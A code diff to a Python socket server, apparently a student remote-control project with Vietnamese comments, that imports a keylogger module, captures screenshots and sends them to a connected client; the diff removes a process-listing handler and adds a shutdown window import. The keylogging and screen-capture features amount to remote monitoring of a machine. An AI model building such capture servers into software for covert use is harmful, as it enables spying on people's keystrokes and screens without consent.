@@ -3,8 +3,7 @@ import threading
 from PIL import ImageGrab  # Để chụp màn hình
 import io
 from keylogger import Keylogger
-import psutil
-
+from shutdown import ServerShutdownWindow
 
 class Server:
     def __init__(self):
@@ -79,19 +78,8 @@ class Server:
             client_socket.sendall(str(len(screenshot)).encode())  # Gửi kích thước trước
             client_socket.sendall(screenshot)  # Gửi dữ liệu hình ảnh
             return None  # Không cần trả về gì ở đây
-        elif request == "get_processes":
-            # Lấy danh sách các tiến trình hoạt động
-            process_list = psutil.process_iter(attrs=['pid', 'name', 'cmdline', 'username', 'cpu_percent', 'memory_info'])
-            # Biến để lưu thông tin về tiến trình
-            process_info = []
-            for process in process_list:
-                process_info.append(f"PID: {process.info['pid']}, Name: {process.info['name']}")
-            # Trả về thông tin về các tiến trình dưới dạng chuỗi
-            return '\n'.join(process_info)
         else:
             return "Invalid request."
-
-
 
     def capture_screenshot(self):
         try:
